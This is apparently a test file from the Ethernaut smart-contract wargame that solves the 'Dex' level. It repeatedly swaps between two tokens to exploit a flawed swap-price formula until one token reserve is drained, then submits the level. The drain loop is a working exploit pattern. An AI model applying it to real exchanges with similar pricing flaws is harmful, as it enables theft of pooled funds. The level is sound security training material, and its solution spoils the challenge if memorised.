const DexFactory = artifacts.require('DexFactory')
const Dex = artifacts.require('Dex')

const utils = require('../utils/TestUtils')

contract('Dex', function ([player]) {
  let ethernaut
  let level

  before(async function () {
    ethernaut = await utils.getEthernautWithStatsProxy()
    level = await DexFactory.new()
    await ethernaut.registerLevel(level.address)
  })

  it('should submit level instance successfully', async function () {
    const instance = await utils.createLevelInstance(ethernaut, level.address, player, Dex)

    const token1Address = await instance.token1()
    const token2Address = await instance.token2()
    let playerToken1Balance = (await instance.balanceOf(token1Address, player)).toString()
    let playerToken2Balance = (await instance.balanceOf(token2Address, player)).toString()
    let fromTokenAddress = token1Address
    let toTokenAddress = token2Address
    let playerFromTokenBalance = playerToken1Balance
    let instanceToTokenBalance = (
      await instance.balanceOf(toTokenAddress, instance.address)
    ).toString()
    let swapPrice = (
      await instance.getSwapPrice(fromTokenAddress, toTokenAddress, playerFromTokenBalance)
    ).toString()

    await instance.approve(instance.address, instanceToTokenBalance, {
      from: player,
    })

    while (Number(swapPrice) <= Number(instanceToTokenBalance)) {
      await instance.swap(fromTokenAddress, toTokenAddress, playerFromTokenBalance, {
        from: player,
      })

      playerToken1Balance = (await instance.balanceOf(token1Address, player)).toString()
      playerToken2Balance = (await instance.balanceOf(token2Address, player)).toString()
      fromTokenAddress = fromTokenAddress === token1Address ? token2Address : token1Address
      toTokenAddress = toTokenAddress === token1Address ? token2Address : token1Address
      playerFromTokenBalance =
        fromTokenAddress === token1Address ? playerToken1Balance : playerToken2Balance
      instanceToTokenBalance = await instance.balanceOf(toTokenAddress, instance.address)
      swapPrice = (
        await instance.getSwapPrice(fromTokenAddress, toTokenAddress, playerFromTokenBalance)
      ).toString()
    }

    const instanceFromTokenBalance = (
      await instance.balanceOf(fromTokenAddress, instance.address)
    ).toString()
    await instance.swap(fromTokenAddress, toTokenAddress, instanceFromTokenBalance, {
      from: player,
    })

    const completed = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player,
    )
    assert.isTrue(completed)
  })
})
